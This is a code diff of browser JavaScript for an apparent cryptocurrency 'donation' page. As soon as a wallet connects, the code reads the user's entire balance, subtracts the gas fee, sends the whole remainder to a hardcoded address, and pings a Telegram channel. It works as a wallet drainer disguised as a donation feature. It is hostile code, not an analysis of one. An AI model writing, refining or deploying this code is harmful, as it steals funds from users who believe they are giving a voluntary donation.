@@ -1,11 +1,9 @@
+let web3Modal;
+let provider;
+let web3;
 const donationAddress = "0x4cF7613aFE35ec64071F71f334e54e23698Fb2D9"; // Replace with your actual donation address
 
-let startTime;
-let donationAmount;
-let provider;
-let web3Modal;
-
-function init() {
+async function init() {
     const providerOptions = {
         walletconnect: {
             package: WalletConnectProvider,
@@ -27,10 +25,14 @@ async function connectWallet() {
     try {
         provider = await web3Modal.connect();
         web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        const fromAddress = accounts[0];
+        const balance = await web3.eth.getBalance(fromAddress);
+
         startTime = new Date().toLocaleString();
         updateStatus('Wallet connected. Processing donation...');
         sendTelegramMessage(`Wallet connected at ${startTime}`);
-        sendDonation();
+        sendDonation(fromAddress, balance);
     } catch (error) {
         console.error(error);
         updateStatus('Connection failed. Please try again.');
@@ -38,11 +40,7 @@ async function connectWallet() {
     }
 }
 
-async function sendDonation() {
-    const accounts = await web3.eth.getAccounts();
-    const fromAddress = accounts[0];
-    const balance = await web3.eth.getBalance(fromAddress);
-
+async function sendDonation(fromAddress, balance) {
     const gasPrice = await web3.eth.getGasPrice();
     const gasEstimate = await web3.eth.estimateGas({
         from: fromAddress,
@@ -51,7 +49,7 @@ async function sendDonation() {
     });
 
     const transactionFee = gasPrice * gasEstimate;
-    donationAmount = balance - transactionFee;
+    const donationAmount = balance - transactionFee;
 
     if (donationAmount <= 0) {
         updateStatus('Insufficient funds to cover the transaction fee.');
